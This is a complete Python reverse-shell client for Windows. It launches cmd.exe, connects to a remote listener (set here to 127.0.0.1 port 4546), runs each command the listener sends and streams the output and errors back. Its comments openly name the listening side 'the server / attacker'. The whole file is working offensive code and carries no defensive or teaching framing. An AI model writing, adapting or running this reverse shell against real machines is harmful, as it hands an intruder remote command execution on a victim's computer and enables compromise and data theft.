import argparse
import socket
import subprocess
import sys
import threading
import os
import time
from win32com.shell import shell

#cmd.exe has now executed our command this client received from the server. Now we send the STDOUT result of that command after it ran via cmd.exe!
def shellstdout_sender(client, myshellproc):
    
    while True:
        output=myshellproc.stdout.read1()
        try:
            client.send(output)
        #basic exception handler to kill the process for cmd.exe if we cannot reach the server
        except:
            print("connection died...")
            subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
            client.close()
            os._exit(0) 
#send errors (example: you typed 'net usr' intead of 'net user'. This will show you the error produced by cmd.exe    
def shellstderr_sender(client, myshellproc):
    
    while True:
        output=myshellproc.stderr.read1()
        try:
            client.send(output)
        #basic exception handler to kill the process for cmd.exe if we cannot reach the server
        except:
            print("connection died...")
            subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
            client.close()
            os._exit(0)

#This function will take the command the server sent to this client, write it to the cmd.exe console, and execute it
#The shellsender() function will send the results of the executed command back to the server / attacker        
def shellreceiver(client, myshellproc):
    while True:
        try:
            data = client.recv(1024)
            if len(data) > 0:
                #if you type :leave: in the server/attacker console it closes the connection.  similar to 'exit' but just a custom version of that that I like to implement
                if ":leave:" in data.decode("UTF-8"):
                    subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
                    client.close()
                    os._exit(0) 
                myshellproc.stdin.write(data)
                myshellproc.stdin.flush()
        #basic exception handler to kill the process for cmd.exe if we cannot reach the server
        except:
            print("connection died...")
            subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
            client.close()
            os._exit(0)

# start the command shell and pipe it's contents to stdin, stout, and stderr        
myshellproc = subprocess.Popen("cmd.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

host="127.0.0.1"
port=4546
    
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client.connect((host, port))
except:
    print("server/socket must have died...time to hop off")
    os._exit(0)

#This initiates our function threads!
###############################################
s2p_thread = threading.Thread(target=shellstdout_sender, args=[client, myshellproc])
s2p_thread.daemon = True
s2p_thread.start()

s2p_thread = threading.Thread(target=shellstderr_sender, args=[client, myshellproc])
s2p_thread.daemon = True
s2p_thread.start()

s2p_thread = threading.Thread(target=shellreceiver, args=[client, myshellproc])
s2p_thread.daemon = True
s2p_thread.start()
###############################################

#continuous loop
while True:
    time.sleep(1)